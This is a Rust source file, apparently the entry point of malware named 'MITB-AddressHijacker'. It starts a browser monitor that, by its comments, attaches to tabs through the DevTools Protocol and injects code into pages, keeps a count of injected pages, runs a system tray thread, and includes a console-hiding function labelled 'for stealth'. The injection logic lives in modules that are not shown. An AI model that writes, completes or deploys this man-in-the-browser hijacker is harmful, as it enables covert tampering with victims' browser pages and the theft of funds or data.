use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::time;

mod browser;
mod system_tray;
mod injector;

// Shared state between threads
pub struct AppState {
    pub running: bool,
    pub pages_injected: u32,
}

impl Default for AppState {
    fn default() -> Self {
        Self { running: true, pages_injected: 0 }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    
    println!("[*] MITB-AddressHijacker starting...");
    
    // Comment out for debugging - uncomment for stealth
    // #[cfg(windows)]
    // hide_console();

    let state = Arc::new(Mutex::new(AppState::default()));

    // Spawn browser monitor thread - connects to CDP and injects into tabs
    let browser_state = Arc::clone(&state);
    tokio::spawn(async move {
        browser::monitor(browser_state).await;
    });

    // Spawn system tray thread
    let tray_state = Arc::clone(&state);
    std::thread::spawn(move || {
        let _ = system_tray::run(tray_state);
    });

    // Main loop - keeps app alive until quit
    loop {
        time::sleep(Duration::from_secs(1)).await;
        if !state.lock().unwrap().running { break; }
    }
    Ok(())
}

// Hide console window for stealth
#[cfg(windows)]
fn hide_console() {
    use winapi::um::wincon::GetConsoleWindow;
    use winapi::um::winuser::{ShowWindow, SW_HIDE};
    unsafe {
        let window = GetConsoleWindow();
        if !window.is_null() { ShowWindow(window, SW_HIDE); }
    }
}
